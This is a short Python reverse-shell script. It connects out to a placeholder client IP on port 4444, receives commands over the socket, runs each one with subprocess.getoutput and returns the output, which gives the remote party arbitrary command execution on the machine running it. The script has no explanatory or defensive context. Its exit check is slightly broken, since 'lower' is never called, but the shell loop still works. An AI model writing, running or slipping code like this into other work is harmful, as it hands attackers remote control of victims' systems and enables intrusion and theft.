import subprocess
import socket
host = "Cilent ip"
port = 4444
buf = 1024
s = socket.socket()
s.connect((host, port))
print("[+] Connect Done...! ")
while True:
	command = s.recv(buf).decode()
	if command.lower == "exit":
		break
	output = subprocess.getoutput(command)
	s.send(output.encode())
s.close()
